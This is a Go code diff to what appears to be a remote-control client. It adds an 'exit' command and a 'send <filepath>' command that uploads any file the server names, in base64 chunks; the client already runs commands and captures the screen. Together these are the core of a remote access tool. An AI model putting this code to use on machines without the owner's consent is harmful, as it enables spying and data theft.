@@ -13,6 +13,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 	"time"
 	"unicode/utf8"
@@ -157,6 +158,23 @@ Examples:
 		return
 	}
 
+	// Exit command - client should disconnect
+	if message == "exit" {
+		log.Println("Received exit command from server, disconnecting...")
+		sendTextResponse(conn, "Client is disconnecting...\n")
+		// We'll close the connection by returning an error
+		return
+	}
+
+	// File sending command: send <filepath>
+	if strings.HasPrefix(message, "send ") {
+		filePath := strings.TrimPrefix(message, "send ")
+		filePath = strings.TrimSpace(filePath)
+		log.Printf("Sending file: %s", filePath)
+		sendFileToServer(conn, filePath)
+		return
+	}
+
 	// Special case: screen capture command
 	if message == "cmd capture screen" {
 		log.Println("Capturing screen...")
@@ -191,6 +209,97 @@ Examples:
 	sendResponse(conn, output, err)
 }
 
+func sendFileToServer(conn net.Conn, filePath string) {
+	// Check if file exists
+	if _, err := os.Stat(filePath); os.IsNotExist(err) {
+		errorMsg := fmt.Sprintf("File not found: %s\n", filePath)
+		sendTextResponse(conn, errorMsg)
+		return
+	}
+
+	// Open file
+	file, err := os.Open(filePath)
+	if err != nil {
+		errorMsg := fmt.Sprintf("Failed to open file: %v\n", err)
+		sendTextResponse(conn, errorMsg)
+		return
+	}
+	defer file.Close()
+
+	// Get file info
+	fileInfo, err := file.Stat()
+	if err != nil {
+		errorMsg := fmt.Sprintf("Failed to get file info: %v\n", err)
+		sendTextResponse(conn, errorMsg)
+		return
+	}
+
+	fileSize := fileInfo.Size()
+	fileName := filepath.Base(filePath)
+
+	// Send file transfer header
+	header := fmt.Sprintf("FILE_TRANSFER_START:%s:%d\n", fileName, fileSize)
+	_, err = conn.Write([]byte(header))
+	if err != nil {
+		log.Printf("Failed to send file transfer header: %v", err)
+		return
+	}
+
+	// Send file content with progress tracking
+	buffer := make([]byte, 32768) // 32KB chunks for better performance
+	totalSent := int64(0)
+	lastProgress := 0
+	chunkNumber := 0
+
+	// 添加写入确认机制
+	for {
+		n, err := file.Read(buffer)
+		if err != nil && err != io.EOF {
+			errorMsg := fmt.Sprintf("Failed to read file: %v\n", err)
+			conn.Write([]byte(fmt.Sprintf("ERROR:%s\n", errorMsg)))
+			return
+		}
+		if n == 0 {
+			break
+		}
+
+		chunkNumber++
+
+		// Encode chunk as base64
+		encoded := base64.StdEncoding.EncodeToString(buffer[:n])
+
+		// 为每个chunk添加序号和长度信息，便于调试和验证
+		chunkHeader := fmt.Sprintf("CHUNK:%d:%d:", chunkNumber, len(encoded))
+		fullChunk := chunkHeader + encoded + "\n"
+
+		// 发送chunk并检查错误
+		_, err = conn.Write([]byte(fullChunk))
+		if err != nil {
+			log.Printf("Failed to send file chunk %d: %v", chunkNumber, err)
+			return
+		}
+
+		totalSent += int64(n)
+
+		// Calculate and log progress
+		progress := int(float64(totalSent) / float64(fileSize) * 100)
+		if progress/10 > lastProgress/10 || progress == 100 {
+			log.Printf("File transfer progress: %d%% (%d/%d bytes, chunk: %d)",
+				progress, totalSent, fileSize, chunkNumber)
+			lastProgress = progress
+		}
+	}
+
+	// Send end marker
+	_, err = conn.Write([]byte("FILE_TRANSFER_END\n"))
+	if err != nil {
+		log.Printf("Failed to send file transfer end marker: %v", err)
+		return
+	}
+
+	log.Printf("File sent successfully: %s (%d bytes, %d chunks)",
+		fileName, fileSize, chunkNumber)
+}
 func captureScreenAndSend(conn net.Conn) {
 	// Capture actual screen
 	img, err := captureScreen()
